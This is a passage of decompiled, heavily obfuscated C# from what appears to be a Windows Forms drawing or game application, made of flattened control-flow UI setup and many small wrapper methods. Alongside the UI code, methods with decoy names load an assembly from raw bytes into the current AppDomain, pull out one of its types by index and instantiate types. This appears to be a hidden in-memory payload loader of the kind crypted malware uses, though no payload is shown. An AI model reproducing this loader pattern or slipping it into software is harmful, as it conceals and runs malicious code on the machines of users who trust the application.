					num = (int)(num2 * 35923084) ^ -1472440000;
					continue;
				case 9u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)(num2 * 388590730) ^ -1685139874;
					continue;
				case 8u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)(num2 * 2096767675) ^ -1758551342;
					continue;
				case 7u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -836470657) ^ 0x3FAF3AD7;
					continue;
				case 6u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)((num2 * 691143744) ^ 0x32CA3C1);
					continue;
				case 5u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1248218694) ^ 0x2A341DE7;
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -1104262081) ^ 0x2DBA2F4F;
					continue;
				case 3u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 563078044) ^ 0x2FE213B7);
					continue;
				case 2u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -1134192058) ^ 0x7B42055;
					continue;
				case 1u:
					pictureBox1 = Form1.smethod_2();
					num = (int)((num2 * 1187374309) ^ 0x61504378);
					continue;
				case 0u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -881007135) ^ -406422386;
					continue;
				default:
					return;
				case 92u:
					break;
				case 74u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = -1035551842;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA9AA9847u) % 4u)
				{
				case 2u:
					PerformTable(q);
					num = ((int)num2 * -1176481900) ^ 0x67C74634;
					continue;
				case 1u:
					q = ContextAdd(Level);
					num = (int)((num2 * 726307255) ^ 0x136585EE);
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 885729633;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7DF30DDFu) % 4u)
				{
				case 3u:
					num = (int)(num2 * 1070402929) ^ -1756567823;
					continue;
				case 2u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = ((int)num2 * -451600684) ^ 0x25FA4194;
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = -232029304;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x88AA66F8u) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = (int)(num2 * 975634154) ^ -923984691;
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
